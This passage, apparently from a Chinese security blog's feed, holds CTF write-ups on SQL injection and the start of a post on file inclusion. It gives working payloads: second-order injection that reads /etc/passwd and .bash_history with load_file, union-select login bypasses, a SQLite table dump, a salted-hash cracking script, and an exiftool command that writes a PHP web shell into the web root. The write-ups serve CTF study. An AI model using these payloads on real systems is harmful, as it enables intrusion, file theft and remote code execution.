punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>write</code>操作对应发帖，<code>comment</code>操作对应评论操作，但是在进行这些操作的前提是要登录上，于是我们看到登录界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt="" loading="lazy"></p><p>两个提示似乎在暗示这什么，于是对密码的三个*出处进行爆破，得到密码<code>zhangwei666</code>成功登录，来到发帖界面，首先我们看发帖操作，用<code>addslashes</code>函数对参数进行了过滤，说到<code>addslashes</code>引发的安全问题可以查看这篇文章：<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p><p>里面介绍了绕过<code>addslashes</code>函数的方法，但在这里似乎用不到，仔细观察代码，<code>addslashes</code>函数限制了我们对一些特殊符号的操作，使得sql语句能够正常的执行，但并没有改变插入到数据库中的数据，测试如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt="" loading="lazy"></p><p>可以看到并不会改变存入数据库中的内容，查询出里面的结果也是一样，于是我们再看到<code>commit</code>操作，里面的<code>mysql_fetch_array</code>函数在数据库中取出<code>category</code>字段中的内容，然后再直接进行了<code>insert into</code>存入评论数据的操作操作传入的参数<code>category</code>我们可，后面的<code>content</code>参数我们也可控于是就可以进行如下操作：</p><p>先传入<code>category</code>字段的值为<code>a&#39;,content=(select user()),/*</code>,前面的单引号虽然在存入数据库的过程中被转义了，但是数据库中华存的依旧是用来的内容，后面的取出来的时候也会将单引号原封不动的取出来，在进行<code>comment</code>的<code>insert into</code>操作时候，就会闭合前面的单引号，从而达到注入的目的，然后跟上的<code>content</code>值当然就是要进行<code>sql</code>注入查找数据的操作，然后再接上<code>/*</code>，这样我们后面再评论页面进行评论的时候传入<code>*/#</code>就能成功的和前面的闭合起来，总<code>payload</code>如下：</p><pre class=" language-mysql"><code class="language-mysql">insert into comment set category = 'a',content=(select user()),/*',content = '*/#',bo_id = '$bo_id'";</code></pre><p>得到回显：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt="" loading="lazy"></p><p>尝试写马无果，应该是权限不够，然后再ctf数据库查到三个表<code>board,comment,user</code></p><p><code>user</code>表中有如下列</p><pre><code>id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre><p><code>board</code>表中有如下列</p><pre><code>id,category,title,content</code></pre><p><code>comment</code>表中有如下列</p><pre><code>id,bo_id,category,content</code></pre><p>经过一番查找后并没有发现存在<code>flag</code>的内容，看来<code>flag</code>并没在数据库中，不在数据库中那只能在文件中了，于是进行文件读取操作，根目录下并没有<code>flag</code>，于是我们左试右试都没发现<code>flag</code>，于是读取<code>/etc/passwd</code></p><pre class=" language-mysql"><code class="language-mysql">a',content = load_file('/etc/passwd'),/*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt="" loading="lazy"></p><p><code>/etc/passwd</code>文件描述参考：<a href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell" target="_blank" rel="noopener">Linux passwd 文件详解</a></p><p>注意到最后一行，<code>www:x:500:500:www:/home/www:/bin/bash</code>www用户在<code>/home/www</code>的目录下进行了<code>/bin/bash</code>的<code>shell</code>操作，于是我们利用<code>.bash_history</code>查找用户使用过的历史命令</p><ul><li><code>.bash_history</code>：保存了当前用户使用过的历史命令,方便查找，参考：<a href="https://blog.csdn.net/caolaosanahnu/article/details/7601074" target="_blank" rel="noopener">linux中Shell历史命令记录文件的路径是什么</a></li></ul><pre class=" language-mysql"><code class="language-mysql">a',content = load_file('/home/www/.bash_history'),/*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt="" loading="lazy"></p><p>可以到进行了如上操作，切换到<code>/tmp</code>目录下，解压<code>html.zip</code>的压缩包，删除压缩包，复制<code>html</code>目录及其子目录到<code>/var/www/html</code>目录下，然后删除了<code>.DS_Store</code>文件，开启<code>Apache</code>服务</p><ul><li><code>.DS_Store</code>：Mac OS 保存文件夹的自定义属性的隐藏文件</li></ul><p>这个过程看上去没毛病，但是中间漏了一点，<code>/tmp</code>目录下了<code>html</code>文件夹中的<code>.DS_Store</code>文件并没用被删除，于是我们尝试读取这个文件，直接读取在页面上回显并不完全</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt="" loading="lazy"></p><p>于是通过<code>hex</code>方式进行读取</p><pre class=" language-mysql"><code class="language-mysql">a',content = hex(load_file('/tmp/html/.DS_Store')),/*</code></pre><p>得到一长串十六进制数字，放到网站上转文本</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt="" loading="lazy"></p><p>可以看到应该存放<code>flag</code>的文件，进行读取</p><pre class=" language-mysql"><code class="language-mysql">a',content = load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'),/*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt="" loading="lazy"></p><p>成功拿到flag</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt="" loading="lazy"></p><p>题目给出的提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt="" loading="lazy"></p><p>随便登录后在前端HTML中都能看到这样一串字母</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre><p>base32解码后得到</p><pre><code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></pre><p>base64解码后得到</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span></code></pre><p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p><p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p><p>利用以下注入语句</p><pre class=" language-sql"><code class="language-sql">name: admin<span class="token string">' And 1>2 union select '</span><span class="token number">1</span><span class="token string">','</span>admin<span class="token string">','</span><span class="token number">c4ca4238a0b923820dcc509a6f75849b</span>pw: <span class="token number">1</span></code></pre><p>注：</p><ul><li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li><li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li><li>过滤了and可以用大写And绕过</li><li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li></ul><p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" / loading="lazy"><p>于是这时输入password=1即可绕过查询得到flag</p><h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p><p>参考：<a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入" target="_blank" rel="noopener">你没见过的注入</a></p><p>再看到文件列表显示的界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt="" loading="lazy"></p><p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p><p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/" target="_blank" rel="noopener">https://exiftool.org/</a></p><p>可以编辑图片的的<code>EXIF</code>信息</p><p>payload：</p><pre class=" language-shell"><code class="language-shell">./exiftool -overwrite_original -comment="y1ng\"');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';#" 1.jpg</code></pre><p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt="" loading="lazy"></p><p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt="" loading="lazy"></p><h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt="" loading="lazy"></p><p>这个网站有很多的<code>pdf</code>文件可以下载，暂时没有什么线索</p><p>访问<code>robots.txt</code>得到<code>login.php</code>和<code>admin.php</code>两个登录界面，<code>admin.php</code>源码存在<code>hint：do not even try to bypass this</code>，<code>login.php</code>源码也存在<code>TODO: Remove ?debug-Parameter!</code>，于是访问<code>/login.php?debug</code>得到<code>login.php</code>的源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token constant">HTML</span><span class="token punctuation">)</span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string">'../fancy.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT id,name from Users where name='"</span><span class="token punctuation">.</span><span class="token variable">$user</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">.</span><span class="token string">"Salz!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>Some Error occourred!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'login.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token constant">HTML</span><span class="token punctuation">)</span></code></pre><p>可以看到用的是<code>SQLite</code>数据库，并且可直接查询，未经过过滤，但是密码进行了加密，先看看里面有什么东西，网上查<code>sqlite</code>的语法，和其它数据库大同小异，过程如下：</p><p>查表：</p><pre class=" language-sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,name FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+&amp;pw=111 </span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt="" loading="lazy"></p><p>查表名及其对应的结构：</p><pre class=" language-sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,sql FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+&amp;pw=111</span></code></pre><p>得到：<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>，可以看到有一个<code>hint</code>字段</p><p>再将内容查询出来：</p><pre class=" language-sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> name<span class="token punctuation">,</span><span class="token punctuation">(</span>id<span class="token operator">/</span>name<span class="token operator">/</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> Users <span class="token keyword">limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+&amp;pw=111</span></code></pre><pre><code>1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love is…?3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre><p>表中只有以上三行字段内容，根据<code>hint</code>可知，应该是要在<code>fav paper</code>中找到一个词+<code>Salz</code>之后<code>sha1</code>得到的值为<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>，这个单词应该就是<code>admin</code>的密码，应该就在前面的那些<code>paper</code>的<code>pdf</code>文件里，于是用<code>wget</code>命令将其全都下载下来：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://124.126.19.106:43631/ -r -np -nd -A .pdf</code></pre><p>再用脚本遍历所有<code>pdf</code>文件中的单词</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfinterp <span class="token keyword">import</span> PDFResourceManager<span class="token punctuation">,</span> PDFPageInterpreter<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>converter <span class="token keyword">import</span> TextConverter<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>layout <span class="token keyword">import</span> LAParams<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfpage <span class="token keyword">import</span> PDFPage<span class="token keyword">import</span> sys<span class="token keyword">import</span> string<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">get_pdf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">"../FlatScience/"</span> <span class="token operator">+</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"../FlatScience/"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"pdf"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">convert_pdf_2_text</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    rsrcmgr <span class="token operator">=</span> PDFResourceManager<span class="token punctuation">(</span><span class="token punctuation">)</span>    retstr <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    device <span class="token operator">=</span> TextConverter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> retstr<span class="token punctuation">,</span> laparams<span class="token operator">=</span>LAParams<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    interpreter <span class="token operator">=</span> PDFPageInterpreter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> device<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        <span class="token keyword">for</span> page <span class="token keyword">in</span> PDFPage<span class="token punctuation">.</span>get_pages<span class="token punctuation">(</span>fp<span class="token punctuation">,</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            interpreter<span class="token punctuation">.</span>process_page<span class="token punctuation">(</span>page<span class="token punctuation">)</span>        text <span class="token operator">=</span> retstr<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    device<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    retstr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">find_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_path <span class="token operator">=</span> get_pdf<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(pdf_path)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> pdf_path<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Searching word in "</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>        pdf_text <span class="token operator">=</span> convert_pdf_2_text<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> word <span class="token keyword">in</span> pdf_text<span class="token punctuation">:</span>            sha1_password <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">+</span> <span class="token string">"Salz!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> sha1_password <span class="token operator">==</span> <span class="token string">'3fab54a50e770d830c0416df817567662a9dc85c'</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the password :"</span> <span class="token operator">+</span> word<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    find_password<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>最后跑出<code>password</code>为<code>ThinJerboa</code>，在<code>admin.php</code>登录即可得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;联合查询注入&quot;&gt;&lt;a href=&quot;#联合查询注入&quot; class=&quot;headerlink&quot; title=&quot;联合查询注入&quot;&gt;&lt;/a&gt;联合查询注入&lt;/h2&gt;&lt;h3 id=&quot;极客大挑战—LoveSQL&quot;&gt;&lt;a href=&quot;#极客大挑战—LoveSQL&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="SQL注入" scheme="https://www.extrader.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-07-14T10:41:13.156Z</updated>
    
    <content type="html"><![CDATA[<p>参考：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p><p>文件包含作用函数：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">require</span><span class="token comment" spellcheck="true">//包含过程中出现错误直接退出程序</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//包含过程出现错误，抛出警告，程序继续运行</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//包括require()的功能，但函数只包含一次</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//包括include()的功能，但函数只包含一次</span></code></pre><p>该函数用以加载另一个文件中的php代码，并且当php来执行</p><p>而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作</p><a id="more"></a><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>无限制：</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token number">1</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token 